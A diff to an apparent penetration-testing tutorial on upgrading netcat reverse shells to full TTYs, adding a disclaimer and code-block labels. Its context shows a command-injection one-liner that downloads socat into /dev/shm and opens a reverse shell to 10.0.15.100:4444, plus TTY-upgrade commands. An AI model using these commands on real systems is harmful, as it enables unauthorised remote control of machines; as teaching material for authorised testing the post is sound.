@@ -9,6 +9,8 @@ show_image_post: true                                    # Change this to true
 #image: /assets/img/                # Add image here for post preview image
 ---
 
+![Hack responsibly disclaimer](/assets/markups/1-hack-responsibly.svg)
+
 ## Upgrading remote shells
 
 After catching a shell through netcat, you are placed in a shell that has very limited functionality. If the remote machine has python or python3 installed you can easily upgrade to a fully functional TTY shell.
@@ -25,7 +27,7 @@ rlwrap nc -lvnp $port
 
 1. First, after recieving your reverse shell you need to check the availability of Python. You can do this with the `which` command.
 
-```
+```bash
 which python python2 python3
 ```
 
@@ -43,7 +45,7 @@ Your command prompt may or may not change to reflect the new shell.  If it does 
 
 4. On your attack platform, you will need to set up your shell to send control charcters and other raw input through the reverse shell.  You can do this by using the `stty` command as below.
 
-```
+```bash
 stty raw -echo
 stty size 
 ```
@@ -54,7 +56,7 @@ The second command above will report the size of your terminal window in rows an
 
 6. Next, on victim machine type the below commands to set some important environment variables.
 
-```
+```bash
 export SHELL=bash
 stty rows $x columns $y #Set remote shell to x number of rows & y columns
 export TERM=xterm-256color #allows you to clear console, and have color output
@@ -119,23 +121,7 @@ This one-liner can be injected wherever you can get command injection for an ins
 wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444
 ```
 
-## Using stty options
-
-```bash
-# In reverse shell
-python -c 'import pty; pty.spawn("/bin/bash")'
-Ctrl-Z
-
-# In Kali
-stty raw -echo
-fg
-
-# In reverse shell
-reset
-export SHELL=bash
-export TERM=xterm-256color
-stty rows <num> columns <cols>
-```
+### Disclaimer
 
 Note: The methods above will not work in every situation.  For example, I have regularly run into a problem on my Kali machine where attempting to use `stty raw -echo` while using `zsh` as my shell will cause the entire terminal to become unusable.  I have gotten around this issue by switching to `bash` before I start any netcat listener that I will be using to catch a shell.
 
